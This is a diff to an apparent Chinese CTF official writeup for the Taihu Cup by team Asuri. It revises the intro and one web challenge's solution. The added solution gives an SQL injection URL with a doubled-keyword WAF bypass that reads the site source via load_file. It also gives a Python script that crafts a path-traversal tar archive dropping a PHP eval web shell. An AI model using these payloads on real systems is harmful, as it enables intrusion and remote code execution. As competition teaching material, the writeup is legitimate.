@@ -11,7 +11,8 @@ categories:
 太湖杯官方writeup
 ---------------
 
-Asuri第一次举办这种外面的比赛，幸苦各位了
+Asuri第一次举办对外的比赛，题目逆向和密码学质量相对较高，web和misc比较容易。  
+因为我们失职，比赛中没有使用动态容器，也是非常非常感谢做出来的师傅没有搅屎Orz
 <!--more-->
 
 ## Web
@@ -29,25 +30,21 @@ unicode规范化参考网址 [https://www.compart.com/en/unicode/](https://www.c
 
 ### cross the filesystem field
 
-1.SQL注入，验证waf的方法，输入1加各种关键字可以发现1select、1union可以通过，但是带入'、''均没有返回猜测语法报错。得知这两个参数可以双写绕过。绕过waf后，获取源码，发现存在隐藏参数submit1
-
+简单的sql注入读源码,双写绕过即可
+`?id=1%20uniunionon%20seselectlect%20load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)
+`
+读到源码后发现目录穿越考点，直接用的python自带的tar, 可以解压目录穿越出去
+```python
+import tarfile 
+import io import requests 
+z_file = tarfile.open("test.tar", mode='w') 
+z_info = tarfile.TarInfo("../../../../../../var/www/html/upload/pwned.php") 
+b = b'<?php eval($_REQUEST["cmd"]);?>' 
+z_info.size = len(b) 
+z_file.addfile(z_info, io.BytesIO(b)) 
+z_file.close()
 ```
-view-source:http://127.0.0.1/?id=1%20uniunionon%20seselectlect%20load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)
-```
-
-2.审计代码知道需要上传tar包，并且需要生成一个可以路径穿越tar包，大致才可如下。然后在upload目录生成一个webshell即可getshell。
-
-![image-20200623235656239](2020-Taihuctf-writeup/image-20200623235656239.png)
-
-3.生成方法
-
-首先准备一个1.php，tar cf 1.tar 1.php
-
-然后使用16进制编辑器，将1.php的路径进行修改，然后修改下面的额验证即可。
-
-参考：[https://blog.csdn.net/xiejianjun417/article/details/94008196](https://blog.csdn.net/xiejianjun417/article/details/94008196)
-
-![image-20200624001210958](2020-Taihuctf-writeup/image-20200624001210958.png)
+修改 submit 到 submit1 上传上去, upload/pwned.php 就是 shell
 
 ## Pwn
 
@@ -1231,5 +1228,4 @@ flag{3CC_I3_Use7f1_HaHA}
 这一题的详细解释放在了[这里](https://www.anquanke.com/post/id/222629)，欢迎师傅们去踩（
 
 ## 总结
-
 出题总的来说队里的师傅们也是尽力了，主要是没想到小比赛来了太多的大师傅，超出了大伙的预料，题目难度把控可能有点问题。不过也是辛苦队伍里面的师傅们了，希望Asuri还能有下一次举办外部比赛的机会~
